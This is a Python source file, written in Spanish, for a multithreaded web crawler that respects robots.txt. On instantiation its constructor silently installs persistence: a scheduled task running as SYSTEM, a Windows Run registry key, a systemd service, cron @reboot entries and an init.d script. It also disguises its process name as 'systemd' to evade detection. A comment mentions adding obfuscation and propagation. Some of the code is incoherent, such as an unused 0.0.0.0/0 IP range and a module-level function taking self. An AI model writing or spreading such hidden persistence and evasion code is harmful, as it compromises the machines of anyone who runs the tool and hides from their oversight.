from urllib.parse import urljoin as ujoin, urlparse as uparse
from bs4 import BeautifulSoup as BS
import time as t
import random as rnd
import json as js
import os
import ipaddress
import requests as req
from threading import Thread, Lock
from queue import Queue
import subprocess
import sys
import platform

def configurar_persistencia(self):
    sistema = platform.system()
    if sistema == "Windows":
        os.system("schtasks /create /tn 'RastreadorWeb' /tr 'python script.py' /sc onlogon")
        os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RastreadorWeb /t REG_SZ /d 'python script.py'")
    elif sistema == "Linux":
        os.system("systemctl enable rastreador.service")
        os.system("crontab -l > mycron; echo '@reboot python script.py' >> mycron; crontab mycron; rm mycron")
    elif sistema == "Darwin":  # macOS
        os.system("launchctl load -w /Library/LaunchAgents/com.ejemplo.rastreador.plist")
        os.system("crontab -l > mycron; echo '@reboot python script.py' >> mycron; crontab mycron; rm mycron")
    else:  # Unix
        os.system("cp script.py /etc/init.d/rastreador; chmod +x /etc/init.d/rastreador")
        os.system("update-rc.d rastreador defaults")

# Incluir métodos de ofuscación y técnicas de propagación

class RastreadorWeb:
    _user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]

    def __init__(self):
        self.url_base = ""
        self.retraso = 1.0
        self.profundidad_max = 3
        self.urls_visitadas = set()
        self.urls_por_visitar = Queue()
        self.archivo_estado = f"estado_{t.strftime('%Y%m%d_%H%M%S')}.json"
        self.reglas_robots = set()
        self.rango_ip = "0.0.0.0/0"  # Rango IPv4 completo
        self.ip_actual = "0.0.0.1"
        self.verbose = True
        self.bloqueo = Lock()
        self.max_hilos = 10  # Número máximo de hilos concurrentes

        # Inicializar persistencia y evasión
        self.inicializar_persistencia()
        self.evasion()

    def inicializar_persistencia(self):
        if os.name == 'nt':
            self.crear_tarea_programada()
            self.agregar_registro_windows()
        else:
            self.crear_servicio_systemd()
            self.agregar_cron_job()

    def crear_tarea_programada(self):
        tarea = "RastreadorWebPersistente"
        comando = f'schtasks /create /tn {tarea} /tr "python {os.path.abspath(__file__)}" /sc onlogon /ru SYSTEM /f'
        try:
            subprocess.run(comando, shell=True, check=True)
            self.imprimir_verbose(f"Tarea programada '{tarea}' creada exitosamente.")
        except subprocess.CalledProcessError:
            self.imprimir_verbose("Error al crear la tarea programada.")

    def agregar_registro_windows(self):
        try:
            import winreg as reg
            clave = reg.HKEY_CURRENT_USER
            sub_clave = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_clave = reg.OpenKey(clave, sub_clave, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_clave, "RastreadorWeb", 0, reg.REG_SZ, f'python {os.path.abspath(__file__)}')
            reg.CloseKey(reg_clave)
            self.imprimir_verbose("Persistencia agregada al registro.")
        except ImportError:
            self.imprimir_verbose("El módulo winreg no está disponible.")
        except WindowsError as e:
            self.imprimir_verbose(f"Error al agregar persistencia al registro: {e}")

    def crear_servicio_systemd(self):
        servicio = """
        [Unit]
        Description=Rastreador Web Persistente

        [Service]
        ExecStart=/usr/bin/python3 {script_path}
        Restart=always

        [Install]
        WantedBy=multi-user.target
        """.format(script_path=os.path.abspath(__file__))

        with open("/etc/systemd/system/rastreador.service", "w") as archivo_servicio:
            archivo_servicio.write(servicio)

        try:
            subprocess.run(["systemctl", "enable", "rastreador.service"], check=True)
            subprocess.run(["systemctl", "start", "rastreador.service"], check=True)
            self.imprimir_verbose("Servicio systemd creado y activado.")
        except subprocess.CalledProcessError:
            self.imprimir_verbose("Error al crear o activar el servicio systemd.")

    def agregar_cron_job(self):
        comando_cron = f"@reboot /usr/bin/python3 {os.path.abspath(__file__)}"
        try:
            subprocess.run(f'(crontab -l; echo "{comando_cron}") | crontab -', shell=True, check=True)
            self.imprimir_verbose("Cron job agregado para persistencia.")
        except subprocess.CalledProcessError:
            self.imprimir_verbose("Error al agregar cron job.")

    def evasion(self):
        # Evasión básica cambiando el nombre del proceso en sistemas Unix
        if os.name != 'nt':
            try:
                import ctypes
                libc = ctypes.cdll.LoadLibrary("libc.so.6")
                libc.prctl(15, "systemd", 0, 0, 0)
                self.imprimir_verbose("Nombre del proceso cambiado para evasión.")
            except Exception as e:
                self.imprimir_verbose(f"Error al cambiar el nombre del proceso: {e}")

    def imprimir_verbose(self, mensaje):
        if self.verbose:
            print(mensaje)

    def cargar_estado(self):
        if os.path.exists(self.archivo_estado):
            with open(self.archivo_estado, "r") as f:
                estado = js.load(f)
                self.urls_visitadas = set(estado.get("visitadas", []))
                self.urls_por_visitar.queue = estado.get("urls_por_visitar", [])
                self.ip_actual = estado.get("ip_actual", self.ip_actual)
                self.imprimir_verbose("Estado cargado desde el archivo.")
        else:
            self.imprimir_verbose("No se encontró archivo de estado.")

    def guardar_estado(self):
        estado = {
            "visitadas": list(self.urls_visitadas),
            "urls_por_visitar": list(self.urls_por_visitar.queue),
            "ip_actual": self.ip_actual
        }
        with open(self.archivo_estado, "w") as f:
            js.dump(estado, f)
        self.imprimir_verbose("Estado guardado en el archivo.")

    def obtener_robots_txt(self):
        url = ujoin(self.url_base, "/robots.txt")
        self.imprimir_verbose(f"Obteniendo robots.txt desde {url}")
        try:
            respuesta = req.get(url, headers={"User-Agent": rnd.choice(self._user_agents)})
            if respuesta.status_code == 200:
                self.imprimir_verbose("robots.txt obtenido con éxito.")
                self.parsear_robots_txt(respuesta.text)
            else:
                self.imprimir_verbose(f"No se encontró robots.txt o error al obtenerlo. Código de estado: {respuesta.status_code}")
        except req.RequestException as e:
            self.imprimir_verbose(f"Error al obtener robots.txt: {e}")

    def parsear_robots_txt(self, texto):
        user_agent = None
        for linea in texto.splitlines():
            linea = linea.strip()
            if linea.startswith("User-agent:"):
                user_agent = linea.split(":", 1)[1].strip()
            elif user_agent == "*" and linea.startswith("Disallow:"):
                ruta = linea.split(":", 1)[1].strip()
                self.reglas_robots.add(ruta)
                self.imprimir_verbose(f"Ruta deshabilitada añadida: {ruta}")

    def deberia_rastrear(self, url):
        ruta = uparse(url).path
        return not any(ruta.startswith(regla) for regla in self.reglas_robots)

    def rastrear_url(self, url, profundidad):
        if url in self.urls_visitadas or profundidad > self.profundidad_max:
            return
        if not self.deberia_rastrear(url):
            self.imprimir_verbose(f"Omitiendo {url} debido a las reglas de robots.txt.")
            return
        self.imprimir_verbose(f"Visitando {url} a profundidad {profundidad}")
        try:
            respuesta = req.get(url, headers={"User-Agent": rnd.choice(self._user_agents)})
            if respuesta.status_code == 200:
                with self.bloqueo:
                    self.urls_visitadas.add(url)
                self.imprimir_verbose(f"Extrayendo enlaces de {url}")
                self.extraer_enlaces(respuesta.text, url, profundidad)
            else:
                self.imprimir_verbose(f"No se pudo obtener {url}. Código de estado: {respuesta.status_code}")
        except req.RequestException as e:
            self.imprimir_verbose(f"Error al obtener {url}: {e}")
        t.sleep(self.retraso)

    def extraer_enlaces(self, html, url_base, profundidad):
        sopa = BS(html, "html.parser")
        for enlace in sopa.find_all("a", href=True):
            href = enlace["href"]
            url_completa = ujoin(url_base, href)
            if url_completa not in self.urls_visitadas:
                self.urls_por_visitar.put((url_completa, profundidad + 1))
                self.imprimir_verbose(f"Añadido {url_completa} a la lista de visitas")

    def generar_rango_ip(self):
        try:
            red = ipaddress.ip_network(self.rango_ip, strict=False)
            return [str(ip) for ip in red.hosts()]
        except ValueError as e:
            self.imprimir_verbose(f"Error con el rango CIDR: {e}")
            return []

    def trabajador(self):
        while not self.urls_por_visitar.empty():
            url, profundidad = self.urls_por_visitar.get()
            self.rastrear_url(url, profundidad)
            self.urls_por_visitar.task_done()
            self.guardar_estado()

    def iniciar_rastreo(self):
        self.verbose = input("¿Habilitar modo verbose? (s/n): ").strip().lower() == 's'
        self.cargar_estado()

        if not self.url_base:
            self.url_base = input("Ingrese la URL base (por ejemplo, https://ejemplo.com): ").strip()
            if not uparse(self.url_base).scheme:
                self.url_base = "https://" + self.url_base
        if not self.url_base.startswith("http"):
            print("Formato de URL inválido. Saliendo.")
            return

        modo = input("¿Iniciar en modo manual? (s/n): ").strip().lower()
        if modo == 's':
            self.ip_actual = input("Ingrese IP inicial (por ejemplo, 10.0.0.1): ").strip()
            self.rango_ip = input("Ingrese el rango de IP (CIDR): ").strip()
        else:
            self.ip_actual = "10.0.0.1"
            self.rango_ip = "0.0.0.0/24"  # Cambia esto a 0.0.0.0/0 si deseas el rango completo

        self.obtener_robots_txt()
        self.urls_por_visitar.put((self.url_base, 0))

        hilos = []
        for _ in range(self.max_hilos):
            t = Thread(target=self.trabajador)
            t.start()
            hilos.append(t)

        for t in hilos:
            t.join()

        print("Rastreo completado.")

if __name__ == "__main__":
    rastreador = RastreadorWeb()
    rastreador.iniciar_rastreo()
